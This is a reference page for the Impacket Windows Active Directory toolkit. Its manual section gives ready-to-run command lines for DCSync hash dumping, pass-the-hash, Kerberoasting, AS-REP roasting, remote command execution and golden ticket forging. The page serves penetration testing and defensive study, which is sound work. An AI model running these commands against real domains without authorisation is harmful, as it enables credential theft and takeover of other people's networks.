# Impacket — Network Protocol Toolkit for AD

Collection of Python classes for working with network protocols in Windows Active Directory environments. Provides both low-level protocol access and ready-to-use scripts for authentication, lateral movement, and exploitation.

## How It Works

Impacket implements Windows protocol clients at the packet level using raw sockets. It supports SMB, MSRPC, LDAP, Kerberos, WMI, DCOM, WinRM, PKINIT, and NTLM authentication across IPv4/IPv6.

**Protocol layers:**

| Layer | Components |
|-------|-----------|
| **Transport** | TCP, SMB (v1/v2/v3), unnamed pipe, named pipe, DCERPC over various transports |
| **Auth** | NTLM, Kerberos (AS/TGS/AP), PKINIT (certificate auth), NTLMv1/v2, LM |
| **Service** | SMB file ops, SAMR, LSAD, DRSUAPI, WMI (DCOM), WinRM (SOAP), DCOM, EPM, LDAP, TDS (MSSQL) |

**Most-used scripts (examples directory):**

| Script | Function |
|--------|----------|
| **secretsdump.py** | Dump hashes from DC (DCSync) or local SAM/SECURITY hives over SMB |
| **psexec.py** | Remote command execution via SMB (PsExec-like) |
| **wmiexec.py** | Remote command execution via WMI (half-interactive shell) |
| **smbexec.py** | Remote command execution via SMB (stealthier, uses Windows services) |
| **atexec.py** | Remote command execution via Scheduled Tasks |
| **dcomexec.py** | Remote command execution via DCOM (MMC, ShellWindows) |
| **GetUserSPNs.py** | Kerberoasting — request TGS for service accounts |
| **GetNPUsers.py** | AS-REP roasting — TGT for users without preauth |
| **ticketer.py** | Golden/Silver ticket creation |
| **goldenPac.py** | Golden ticket + PSExec combined |
| **lookupsid.py** | SID brute-force user enumeration via LSAT |
| **netview.py** | NetSessionEnum — enumerate sessions on remote hosts |
| **reg.py** | Remote registry access (read/write) |
| **rpcdump.py** | DCE/RPC endpoint mapper enumeration |
| **samrdump.py** | SAMR — list users, groups, aliases via RPC |
| **ticketConverter.py** | Convert between .kirbi and .ccache ticket formats |

## Manual

### Authentication

```bash
# All scripts accept these auth forms
# 1. Password
secretsdump.py domain/user:'Password!'@dc.domain.local

# 2. NTLM hash (pass-the-hash)
secretsdump.py domain/user@dc.domain.local -hashes LMHASH:NTHASH

# 3. Kerberos (ccache ticket)
export KRB5CCNAME=/path/to/ticket.ccache
secretsdump.py domain/user@dc.domain.local -k -no-pass

# 4. AES key
secretsdump.py domain/user@dc.domain.local -aesKey <hex_aes256_key>
```

### DCSync (secretsdump.py)

```bash
# Dump krbtgt, all domain users, and machine account hashes
secretsdump.py domain/administrator:'Pass!'@dc.domain.local

# Dump specific user only
secretsdump.py domain/user:'Pass!'@dc.domain.local -just-dc-user krbtgt

# Dump only NTLM hashes (no NTDS.dit extras)
secretsdump.py domain/user:'Pass!'@dc.domain.local -just-dc

# Local SAM dump (if local admin)
secretsdump.py domain/user:'Pass!'@target.domain.local -local
```

### Kerberoasting

```bash
# Request TGS for all users with SPNs
GetUserSPNs.py domain/user:'Pass!'@dc.domain.local -request

# Request for specific user
GetUserSPNs.py domain/user:'Pass!'@dc.domain.local -request-user "svc_sql"

# Output format (-outputfile) for hashcat cracking
GetUserSPNs.py domain/user:'Pass!'@dc.domain.local -request -outputfile hashes.txt
```

### AS-REP Roasting

```bash
# Find users without Kerberos preauth and request TGT
GetNPUsers.py domain/user:'Pass!'@dc.domain.local -request

# Target specific user
GetNPUsers.py domain/user:'Pass!'@dc.domain.local -request -usersfile users.txt

# No credentials (null session)
GetNPUsers.py domain/ -no-pass -usersfile users.txt
```

### Remote Execution

```bash
# PsExec-like — write/run/delete service via ADMIN$
psexec.py domain/user:'Pass!'@target

# WMI — half-interactive shell via WMI
wmiexec.py domain/user:'Pass!'@target

# Scheduled task (no service creation, cleaned up)
atexec.py domain/user:'Pass!'@target 'whoami'

# Stealth SMB exec (no CMD.EXE visible in process list)
smbexec.py domain/user:'Pass!'@target

# DCOM exec
dcomexec.py domain/user:'Pass!'@target
```

### Ticket Manipulation

```bash
# Create golden ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain domain.local Administrator

# Create golden ticket with custom group membership
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain domain.local -groups 500,512,513,519 Administrator

# Convert ticket formats
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

## Build

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

## Install

```bash
# Pip (stable)
pip install impacket

# From source (latest)
pip install git+https://github.com/fortra/impacket.git

# Virtualenv recommended
python -m venv impacket-env
source impacket-env/bin/activate
pip install impacket
```

## Package

| Manager | Command |
|---------|---------|
| pip | `pip install impacket` |
| Kali Linux | `sudo apt install impacket-scripts` |
| Source | `pip install git+https://github.com/fortra/impacket.git` |

## Links

| Resource | URL |
|----------|-----|
| GitHub | https://github.com/fortra/impacket |
| Wiki | https://github.com/fortra/impacket/wiki |
| Examples guide | https://github.com/fortra/impacket/tree/master/examples |
| PyPI | https://pypi.org/project/impacket/ |
| Changelog | https://github.com/fortra/impacket/blob/master/CHANGELOG.md |
| Fortra homepage | https://www.fortra.com/ |
